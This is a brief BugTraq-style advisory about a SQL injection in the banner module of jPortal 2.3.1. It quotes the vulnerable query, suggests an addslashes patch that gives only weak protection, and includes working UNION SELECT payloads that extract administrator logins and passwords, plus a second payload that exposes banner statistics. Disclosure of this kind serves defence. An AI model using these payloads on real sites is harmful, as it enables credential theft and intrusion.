Subject: Sql injection in jPortal version 2.3.1 (module banner)


Hello BugTraq,

I've found possibility to inject sql code in jPortal version 2.3.1, in
module "banner" (module/banner.inc.php).

Bug is in these lines of code:
[code]
$query = "SELECT * FROM $bann_a_tbl WHERE title='$haslo' ORDER BY id DESC";
[/code] - line 192.

There is unfiltered variable $haslo. In order to patch this code just do this:
[code]
$haslo = addslashes($haslo);
$query = "SELECT * FROM $bann_a_tbl WHERE title='$haslo' ORDER BY id DESC";
[/code]

[exploit]
go to http://[victim]/jportal/banner.php and try this:

' UNION SELECT NULL, nick, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
NULL, NULL, NULL, NULL, NULL from admins where '1=1

and then:

' UNION SELECT NULL, pass, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
NULL, NULL, NULL, NULL, NULL from admins where '1=1

After that, You gain login and password of administrator.
[/exploit]

[exploit2]
try to inject this code:
' or id='x    x - banner id
After that, You can see statistics of not banners, to which you
haven't got passwords.
[/exploit2]

Vendor (http://jportal2.com) has been informed already.
